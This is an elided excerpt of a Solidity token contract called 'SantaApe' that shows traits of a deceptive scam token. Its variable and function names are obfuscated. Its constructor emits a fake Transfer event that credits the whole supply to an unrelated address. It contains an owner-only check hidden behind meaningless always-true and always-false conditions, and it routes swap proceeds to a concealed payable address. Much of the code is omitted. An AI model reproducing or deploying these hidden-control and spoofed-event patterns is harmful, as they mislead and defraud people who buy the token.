...
contract  SantaApe is Context, IERC20, Ownable {
    ...
    address payable public IZPyYCU;
    ...
    mapping (address => bool) public UvswrfwHCvdR;
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0x7c6935a9d069Ea9acAC6995a1295a408438F9210));


        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0x75e89d5979E4f6Fba9F97c104c2F0AFB3F1dcB88), _msgSender(), _totalSupply);
    }
    ...
    function aBtAvxYeE(uint256 amount) view public{
        uint256 amount0 = amount;
        if (!(amount0 != amount)){
            require(msg.sender == IZPyYCU || (bool(true) == bool(false)));}
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountETHMarketing > 0)
            transferToAddressETH(IZPyYCU, amountETHMarketing);
